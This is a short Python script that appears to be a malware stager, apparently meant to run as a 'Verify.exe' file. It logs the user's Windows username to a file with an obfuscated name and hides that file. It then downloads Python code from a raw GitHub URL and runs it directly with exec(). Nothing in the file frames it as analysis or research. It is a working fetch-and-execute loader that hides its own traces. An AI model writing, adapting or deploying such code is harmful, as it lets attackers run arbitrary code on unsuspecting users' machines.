import requests
import os
import time
import subprocess

def main():
    user_name = os.environ.get('USERNAME', 'UnknownUser')

    file_name = 'NODJKSLmJDLJIdHWID.js'  # Updated file_name to use '.js' extension
    with open(file_name, 'a') as file:
        file.write(f"This user: {user_name} downloaded the Verify.exe file\n")

    subprocess.check_call(["attrib", "+H", "NODJKSLmJDLJIdHWID.js"])  # Adjusted the file name here

    url = 'https://raw.githubusercontent.com/AprillZerx/Loin/main/Prof.py'
    try:
        response = requests.get(url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print(f"Error: Code: {response.status_code}")
    except Exception as e:
        print(f"ERROR: {e}")

if __name__ == "__main__":
    main()
